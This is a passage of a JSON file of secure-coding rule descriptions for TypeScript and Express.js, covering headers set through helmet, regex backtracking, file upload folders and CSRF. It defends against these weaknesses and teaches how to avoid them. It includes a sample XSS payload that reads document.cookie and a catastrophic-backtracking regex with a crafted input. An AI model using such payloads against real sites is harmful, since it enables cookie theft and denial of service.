<code>'none'</code>):</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet.contentSecurityPolicy({\n    directives: {\n      // other directives\n      frameAncestors: [\"'none'\"] // Sensitive: frameAncestors  is set to none\n    }\n  })\n);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In Express.js application a standard way to implement CSP frame-ancestors directive is the <a\nhref=\"https://www.npmjs.com/package/helmet-csp\">helmet-csp</a> or <a href=\"https://www.npmjs.com/package/helmet\">helmet</a> middleware:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet.contentSecurityPolicy({\n    directives: {\n      // other directives\n      frameAncestors: [\"'example.com'\"] // Compliant\n    }\n  })\n);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html\">OWASP Cheat Sheets</a> - Clickjacking Defense\n  Cheat Sheet </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors\">developer.mozilla.org</a> -\n  Frame-ancestors </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\">developer.mozilla.org</a> - Content Security Policy (CSP) </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/451\">CWE-451 - User Interface (UI) Misrepresentation of Critical Information</a> </li>\n  <li> <a href=\"https://www.w3.org/TR/CSP3/\">w3.org</a> - Content Security Policy Level 3 </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S5730": {
        "name": "Allowing mixed-content is security-sensitive",
        "htmlDesc": "<p>A mixed-content is when a resource is loaded with the HTTP protocol, from a website accessed with the HTTPs protocol, thus mixed-content are not\nencrypted and exposed to <a href=\"https://en.wikipedia.org/wiki/Man-in-the-middle_attack\">MITM attacks</a> and could break the entire level of\nprotection that was desired by implementing encryption with the HTTPs protocol.</p>\n<p>The main threat with mixed-content is not only the confidentiality of resources but the whole website integrity:</p>\n<ul>\n  <li> A passive mixed-content (eg: <em>&lt;img src=\"http://example.com/picture.png\"&gt;</em>) allows an attacker to access and replace only these\n  resources, like images, with malicious ones that could lead to successful phishing attacks. </li>\n  <li> With active mixed-content (eg: <em>&lt;script src=\"http://example.com/library.js\"&gt;</em>) an attacker can compromise the entire website by\n  injecting malicious javascript code for example (accessing and modifying the DOM, steal cookies, etc). </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The HTTPS protocol is in place and external resources are fetched from the website pages. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Implement content security policy <em>block-all-mixed-content</em> directive which is supported by all modern browsers and will block loading of\nmixed-contents.</p>\n<h2>Sensitive Code Example</h2>\n<p>In Express.js application the code is sensitive if the <a href=\"https://www.npmjs.com/package/helmet-csp\">helmet-csp</a> or <a\nhref=\"https://www.npmjs.com/package/helmet\">helmet</a> middleware is used without the <code>blockAllMixedContent</code> directive:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet.contentSecurityPolicy({\n    directives: {\n      \"default-src\": [\"'self'\", 'example.com', 'code.jquery.com']\n    } // Sensitive: blockAllMixedContent directive is missing\n  })\n);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In Express.js application a standard way to block mixed-content is to put in place the <a\nhref=\"https://www.npmjs.com/package/helmet-csp\">helmet-csp</a> or <a href=\"https://www.npmjs.com/package/helmet\">helmet</a> middleware with the\n<code>blockAllMixedContent</code> directive:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet.contentSecurityPolicy({\n    directives: {\n      \"default-src\": [\"'self'\", 'example.com', 'code.jquery.com'],\n      blockAllMixedContent: [] // Compliant\n    }\n  })\n);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content\">developer.mozilla.org</a> - Mixed-content </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\">developer.mozilla.org</a> - Content Security Policy (CSP) </li>\n  <li> <a href=\"https://www.w3.org/TR/CSP3/\">w3.org</a> - Content Security Policy Level 3 </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S5734": {
        "name": "Allowing browsers to sniff MIME types is security-sensitive",
        "htmlDesc": "<p><a href=\"https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/\">MIME confusion</a> attacks occur when an\nattacker successfully tricks a web-browser to interpret a resource as a different type than the one expected. To correctly interpret a resource\n(script, image, stylesheet …​) web browsers look for the <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type\">Content-Type\nheader</a> defined in the HTTP response received from the server, but often this header is not set or is set with an incorrect value. To avoid\ncontent-type mismatch and to provide the best user experience, web browsers try to deduce the right content-type, generally by inspecting the content\nof the resources (the first bytes). This \"guess mechanism\" is called <a href=\"https://en.wikipedia.org/wiki/Content_sniffing\">MIME type\nsniffing</a>.</p>\n<p>Attackers can take advantage of this feature when a website (\"example.com\" here) allows to upload arbitrary files. In that case, an attacker can\nupload a malicious image <em>fakeimage.png</em> (containing malicious JavaScript code or <a\nhref=\"https://docs.microsoft.com/fr-fr/archive/blogs/ieinternals/script-polyglots\">a polyglot content</a> file) such as:</p>\n<pre>\n&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n</pre>\n<p>When the victim will visit the website showing the uploaded image, the malicious script embedded into the image will be executed by web browsers\nperforming MIME type sniffing.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type\">Content-Type</a> header is not systematically set for all\n  resources. </li>\n  <li> Content of resources can be controlled by users. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Implement <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options\">X-Content-Type-Options</a> header with\n<em>nosniff</em> value (the only existing value for this header) which is supported by all modern browsers and will prevent browsers from performing\nMIME type sniffing, so that in case of Content-Type header mismatch, the resource is not interpreted. For example within a &lt;script&gt; object\ncontext, JavaScript MIME types are expected (like <em>application/javascript</em>) in the Content-Type header.</p>\n<h2>Sensitive Code Example</h2>\n<p>In Express.js application the code is sensitive if, when using <a href=\"https://www.npmjs.com/package/helmet\">helmet</a>, the <code>noSniff</code>\nmiddleware is disabled:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet({\n    noSniff: false, // Sensitive\n  })\n);\n</pre>\n<h2>Compliant Solution</h2>\n<p>When using <code>helmet</code> in an Express.js application, the <code>noSniff</code> middleware should be enabled (it is also done by\ndefault):</p>\n<pre>\nconst express = require('express');\nconst helmet= require('helmet');\n\nlet app = express();\n\napp.use(helmet.noSniff());\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options\">developer.mozilla.org</a> - X-Content-Type-Options\n  </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/\">blog.mozilla.org</a> - Mitigating MIME\n  Confusion Attacks in Firefox </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S5736": {
        "name": "Disabling strict HTTP no-referrer policy is security-sensitive",
        "htmlDesc": "<p><a href=\"https://en.wikipedia.org/wiki/HTTP_referer\">HTTP header referer</a> contains a URL set by web browsers and used by applications to track\nfrom where the user came from, it’s for instance a relevant value for web analytic services, but it can cause <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns\">serious privacy and security problems</a>\nif the URL contains confidential information. Note that Firefox for instance, to prevent data leaks, <a\nhref=\"https://blog.mozilla.org/security/2018/01/31/preventing-data-leaks-by-stripping-path-information-in-http-referrers/\">removes path\ninformation</a> in the Referer header while browsing privately.</p>\n<p>Suppose an e-commerce website asks the user his credit card number to purchase a product:</p>\n<pre>\n&lt;html&gt;\n&lt;body&gt;\n&lt;form action=\"/valid_order\" method=\"GET\"&gt;\nType your credit card number to purchase products:\n&lt;input type=text id=\"cc\" value=\"1111-2222-3333-4444\"&gt;\n&lt;input type=submit&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n</pre>\n<p>When submitting the above HTML form, a HTTP GET request will be performed, the URL requested will be\nhttps://example.com/valid_order?cc=1111-2222-3333-4444 with credit card number inside and it’s obviously not secure for these reasons:</p>\n<ul>\n  <li> URLs are stored in the history of browsers. </li>\n  <li> URLs could be accidentally shared when doing copy/paste actions. </li>\n  <li> URLs can be stolen if a malicious person looks at the computer screen of an user. </li>\n</ul>\n<p>In addition to these threats, when further requests will be performed from the \"valid_order\" page with a simple legitimate embedded script like\nthat:</p>\n<pre>\n&lt;script src=\"https://webanalyticservices_example.com/track\"&gt;\n</pre>\n<p>The referer header which contains confidential information will be send to a third party web analytic service and cause privacy issue:</p>\n<pre>\nGET /track HTTP/2.0\nHost: webanalyticservices_example.com\nReferer: https://example.com/valid_order?cc=1111-2222-3333-4444\n</pre>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Confidential information exists in URLs. </li>\n  <li> Semantic of HTTP methods is not respected (eg: use of a GET method instead of POST when the state of the application is changed). </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Confidential information should not be set inside URLs (GET requests) of the application and a safe (ie: different from <code>unsafe-url</code> or\n<code>no-referrer-when-downgrade</code>) <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy\">referrer-Policy</a>\nheader, to control how much information is included in the referer header, should be used.</p>\n<h2>Sensitive Code Example</h2>\n<p>In Express.js application the code is sensitive if the <a href=\"https://www.npmjs.com/package/helmet\">helmet</a> <code>referrerPolicy</code>\nmiddleware is disabled or used with <code>no-referrer-when-downgrade</code> or <code>unsafe-url</code>:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\napp.use(\n  helmet.referrerPolicy({\n    policy: 'no-referrer-when-downgrade' // Sensitive: no-referrer-when-downgrade is used\n  })\n);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In Express.js application a secure solution is to user the <a href=\"https://www.npmjs.com/package/helmet\">helmet</a> referrer policy middleware set\nto <code>no-referrer</code>:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet.referrerPolicy({\n    policy: 'no-referrer' // Compliant\n  })\n);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy\">developer.mozilla.org</a> - Referrer-Policy </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns\">developer.mozilla.org</a> -\n  Referer header: privacy and security concerns </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S5852": {
        "name": "Using slow regular expressions is security-sensitive",
        "htmlDesc": "<p>Most of the regular expression engines use backtracking to try all possible execution paths of the regular expression when evaluating an input, in\nsome cases it can cause performance issues, called <strong>catastrophic backtracking</strong> situations. In the worst case, the complexity of the\nregular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger catastrophic\nbacktracking and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too with, in this case, a\nlarge carefully-crafted input (thousands chars).</p>\n<p>This rule determines the runtime complexity of a regular expression and informs you if it is not linear.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The input is user-controlled. </li>\n  <li> The input size is not restricted to a small number of characters. </li>\n  <li> There is no timeout in place to limit the regex evaluation time. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>To avoid catastrophic backtracking situations, make sure that none of the following conditions apply to your regular expression.</p>\n<p>In all of the following cases, catastrophic backtracking can only happen if the problematic part of the regex is followed by a pattern that can\nfail, causing the backtracking to actually happen.</p>\n<ul>\n  <li> If you have a repetition <code>r*</code> or <code>r*?</code>, such that the regex <code>r</code> could produce different possible matches (of\n  possibly different lengths) on the same input, the worst case matching time can be exponential. This can be the case if <code>r</code> contains\n  optional parts, alternations or additional repetitions (but not if the repetition is written in such a way that there’s only one way to match it).\n  </li>\n  <li> If you have multiple repetitions that can match the same contents and are consecutive or are only separated by an optional separator or a\n  separator that can be matched by both of the repetitions, the worst case matching time can be polynomial (O(n^c) where c is the number of\n  problematic repetitions). For example <code>a*b*</code> is not a problem because <code>a*</code> and <code>b*</code> match different things and\n  <code>a*_a*</code> is not a problem because the repetitions are separated by a <code>'_'</code> and can’t match that <code>'_'</code>. However,\n  <code>a*a*</code> and <code>.*_.*</code> have quadratic runtime. </li>\n  <li> If the regex is not anchored to the beginning of the string, quadratic runtime is especially hard to avoid because whenever a match fails, the\n  regex engine will try again starting at the next index. This means that any unbounded repetition, if it’s followed by a pattern that can fail, can\n  cause quadratic runtime on some inputs. For example <code>str.split(/\\s*,/)</code> will run in quadratic time on strings that consist entirely of\n  spaces (or at least contain large sequences of spaces, not followed by a comma). </li>\n</ul>\n<p>In order to rewrite your regular expression without these patterns, consider the following strategies:</p>\n<ul>\n  <li> If applicable, define a maximum number of expected repetitions using the bounded quantifiers, like <code>{1,5}</code> instead of <code>+</code>\n  for instance. </li>\n  <li> Refactor nested quantifiers to limit the number of way the inner group can be matched by the outer quantifier, for instance this nested\n  quantifier situation <code>(ba+)+</code> doesn’t cause performance issues, indeed, the inner group can be matched only if there exists exactly one\n  <code>b</code> char per repetition of the group. </li>\n  <li> Optimize regular expressions by emulating <em>possessive quantifiers</em> and <em>atomic grouping</em>. </li>\n  <li> Use negated character classes instead of <code>.</code> to exclude separators where applicable. For example the quadratic regex\n  <code>.*_.*</code> can be made linear by changing it to <code>[^_]*_.*</code> </li>\n</ul>\n<p>Sometimes it’s not possible to rewrite the regex to be linear while still matching what you want it to match. Especially when the regex is not\nanchored to the beginning of the string, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following approaches:</p>\n<ul>\n  <li> Solve the problem without regular expressions </li>\n  <li> Use an alternative non-backtracking regex implementations such as Google’s <a href=\"https://github.com/google/re2\">RE2</a> or <a\n  href=\"https://github.com/uhop/node-re2/\">node-re2</a>. </li>\n  <li> Use multiple passes. This could mean pre- and/or post-processing the string manually before/after applying the regular expression to it or\n  using multiple regular expressions. One example of this would be to replace <code>str.split(/\\s*,\\s*/)</code> with <code>str.split(\",\")</code> and\n  then trimming the spaces from the strings as a second step. </li>\n  <li> It is often possible to make the regex infallible by making all the parts that could fail optional, which will prevent backtracking. Of course\n  this means that you’ll accept more strings than intended, but this can be handled by using capturing groups to check whether the optional parts were\n  matched or not and then ignoring the match if they weren’t. For example the regex <code>x*y</code> could be replaced with <code>x*(y)?</code> and\n  then the call to <code>str.match(regex)</code> could be replaced with <code>matched = str.match(regex)</code> and <code>matched[1] !==\n  undefined</code>. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>The regex evaluation will never end:</p>\n<pre>\n/(a+)+$/.test(\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaa!\"\n); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Possessive quantifiers do not keep backtracking positions, thus can be used, if possible, to avoid performance issues. Unfortunately, they are not\nsupported in JavaScript, but one can still mimick them using lookahead assertions and backreferences:</p>\n<pre>\n/((?=(a+))\\2)+$/.test(\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaa!\"\n); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">owasp.org</a> - OWASP Regular expression Denial\n  of Service - ReDoS </li>\n  <li> <a\n  href=\"https://web.archive.org/web/20220506215733/https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016\">stackstatus.net(archived)</a> - Outage Postmortem - July 20, 2016 </li>\n  <li> <a href=\"https://www.regular-expressions.info/catastrophic.html\">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic\n  Backtracking </li>\n  <li> <a\n  href=\"https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers\">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S5739": {
        "name": "Disabling Strict-Transport-Security policy is security-sensitive",
        "htmlDesc": "<p>When implementing the HTTPS protocol, the website mostly continue to support the HTTP protocol to redirect users to HTTPS when they request a HTTP\nversion of the website. These redirects are not encrypted and are therefore vulnerable to man in the middle attacks. The <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security\">Strict-Transport-Security policy header</a> (HSTS) set by\nan application instructs the web browser to convert any HTTP request to HTTPS.</p>\n<p>Web browsers that see the Strict-Transport-Security policy header for the first time record information specified in the header:</p>\n<ul>\n  <li> the <code>max-age</code> directive which specify how long the policy should be kept on the web browser. </li>\n  <li> the <code>includeSubDomains</code> optional directive which specify if the policy should apply on all sub-domains or not. </li>\n  <li> the <code>preload</code> optional directive which is not part of the HSTS specification but supported on all modern web browsers. </li>\n</ul>\n<p>With the <code>preload</code> directive the web browser never connects in HTTP to the website and to use this directive, it is required <a\nhref=\"https://hstspreload.org/\">to submit</a> the concerned application to a preload service maintained by Google.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The website is accessible with the unencrypted HTTP protocol. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Implement Strict-Transport-Security policy header, it is recommended to apply this policy to all subdomains (<code>includeSubDomains</code>) and\nfor at least 6 months (<code>max-age=15552000</code>) or even better for 1 year (<code>max-age=31536000</code>).</p>\n<h2>Sensitive Code Example</h2>\n<p>In Express.js application the code is sensitive if the <a href=\"https://www.npmjs.com/package/helmet\">helmet</a> or <a\nhref=\"https://www.npmjs.com/package/hsts\">hsts</a> middleware are disabled or used without recommended values:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(helmet.hsts({\n  maxAge: 3153600, // Sensitive, recommended &gt;= 15552000\n  includeSubDomains: false // Sensitive, recommended 'true'\n}));\n</pre>\n<h2>Compliant Solution</h2>\n<p>In Express.js application a standard way to implement HSTS is with the <a href=\"https://www.npmjs.com/package/helmet\">helmet</a> or <a\nhref=\"https://www.npmjs.com/package/hsts\">hsts</a> middleware:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(helmet.hsts({\n  maxAge: 31536000,\n  includeSubDomains: true\n})); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security\">developer.mozilla.org</a> - Strict Transport\n  Security </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S5743": {
        "name": "Allowing browsers to perform DNS prefetching is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>By default, web browsers perform <a href=\"https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch/\">DNS prefetching</a> to reduce\nlatency due to DNS resolutions required when an user clicks links from a website page.</p>\n<p>For instance on example.com the hyperlink below contains a cross-origin domain name that must be resolved to an IP address by the web browser:</p>\n<pre>\n&lt;a href=\"https://otherexample.com\"&gt;go on our partner website&lt;/a&gt;\n</pre>\n<p>It can add significant latency during requests, especially if the page contains many links to cross-origin domains. DNS prefetch allows web\nbrowsers to perform DNS resolving in the background before the user clicks a link. This feature can cause privacy issues because DNS resolving from\nthe user’s computer is performed without his consent if he doesn’t intent to go to the linked website.</p>\n<p>On a complex private webpage, a combination \"of unique links/DNS resolutions\" can indicate, to a eavesdropper for instance, that the user is\nvisiting the private page.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Links to cross-origin domains could result in leakage of confidential information about the user’s navigation/behavior of the website. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Implement <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control\">X-DNS-Prefetch-Control</a> header with an\n<em>off</em> value but this could significantly degrade website performances.</p>\n<h2>Sensitive Code Example</h2>\n<p>In Express.js application the code is sensitive if the <a href=\"https://www.npmjs.com/package/dns-prefetch-control\">dns-prefetch-control</a>\nmiddleware is disabled or used without the recommended value:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet.dnsPrefetchControl({\n    allow: true // Sensitive: allowing DNS prefetching is security-sensitive\n  })\n);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In Express.js application the <a href=\"https://www.npmjs.com/package/dns-prefetch-control\">dns-prefetch-control</a> or <a\nhref=\"https://www.npmjs.com/package/helmet\">helmet</a> middleware is the standard way to implement <code>X-DNS-Prefetch-Control</code> header:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet.dnsPrefetchControl({\n    allow: false // Compliant\n  })\n);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control\">developer.mozilla.org</a> - X-DNS-Prefetch-Control\n  </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch\">developer.mozilla.org</a> - Using dns-prefetch </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S2598": {
        "name": "File uploads should be restricted",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>If the file upload feature is implemented without proper folder restriction, it will result in an implicit trust violation within the server, as\ntrusted files will be implicitly stored alongside third-party files that should be considered untrusted.</p>\n<p>This can allow an attacker to disrupt the security of an internal server process or the running application.</p>\n<h3>What is the potential impact?</h3>\n<p>After discovering this vulnerability, attackers may attempt to upload as many different file types as possible, such as javascript files, bash\nscripts, malware, or malicious configuration files targeting potential processes.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Full application compromise</h4>\n<p>In the worst-case scenario, the attackers succeed in uploading a file recognized by in an internal tool, triggering code execution.</p>\n<p>Depending on the attacker, code execution can be used with different intentions:</p>\n<ul>\n  <li> Download the internal server’s data, most likely to sell it. </li>\n  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>\n  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>\n</ul>\n<h4>Server Resource Exhaustion</h4>\n<p>By repeatedly uploading large files, an attacker can consume excessive server resources, resulting in a denial of service.</p>\n<p>If the component affected by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the\ndenial of service can only affect the attacker who caused it.</p>\n<p>Even though a denial of service might have little direct impact, it can have secondary impact in architectures that use containers and container\norchestrators. For example, it can cause unexpected container failures or overuse of resources.</p>\n<p>In some cases, it is also possible to force the product to \"fail open\" when resources are exhausted, which means that some security features are\ndisabled in an emergency.</p>\n<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h2>How to fix it in Formidable</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst Formidable = require('formidable');\n\nconst form          = new Formidable(); // Noncompliant\nform.uploadDir      = \"/tmp/\";\nform.keepExtensions = true;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst Formidable = require('formidable');\n\nconst form          = new Formidable();\nform.uploadDir      = \"/uploads/\";\nform.keepExtensions = false;\n</pre>\n<h3>How does this work?</h3>\n<h4>Use pre-approved folders</h4>\n<p>Create a special folder where untrusted data should be stored. This folder should be classified as untrusted and have the following\ncharacteristics:</p>\n<ul>\n  <li> It should have specific read and write permissions that belong to the right people or organizations. </li>\n  <li> It should have a size limit or its size should be monitored. </li>\n  <li> It should contain backup copies if it contains data that belongs to users. </li>\n</ul>\n<p>This folder should not be located in <code>/tmp</code>, <code>/var/tmp</code> or in the Windows directory <code>%TEMP%</code>.<br> These folders\nare usually \"world-writable\", can be manipulated, and can be accidentally deleted by the system.</p>\n<p>Also, the original file names and extensions should be changed to controlled strings to prevent unwanted code from being executed based on the file\nnames.</p>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/434\">CWE-434 - Unrestricted Upload of File with Dangerous Type</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload\">OWASP Unrestricted File Upload</a> - Unrestricted File\n  Upload </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S4502": {
        "name": "Disabling CSRF protections is security-sensitive",
        "htmlDesc": "<p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive\nactions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the\napplication.</p>\n<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a\nhidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The web application uses cookies to authenticate users. </li>\n  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>\n  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Protection against CSRF attacks is strongly recommended:\n    <ul>\n      <li> to be activated by default for all <a 